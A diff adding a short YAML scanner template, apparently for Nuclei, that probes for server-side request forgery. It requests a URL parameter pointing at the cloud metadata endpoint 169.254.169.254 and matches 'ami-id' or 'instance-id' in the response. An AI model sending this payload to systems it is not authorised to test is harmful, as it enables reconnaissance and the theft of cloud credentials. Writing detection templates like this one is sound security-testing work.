@@ -1,0 +1,12 @@
+id: K70n0s510-ssrf-meta
+info:
+  name: Generic Cloud Metadata SSRF
+  author: K70n0s510
+  severity: critical
+  tags: a10,ssrf,cloud
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"]
+    matchers:
+      - type: word
+        words: ["ami-id", "instance-id"]
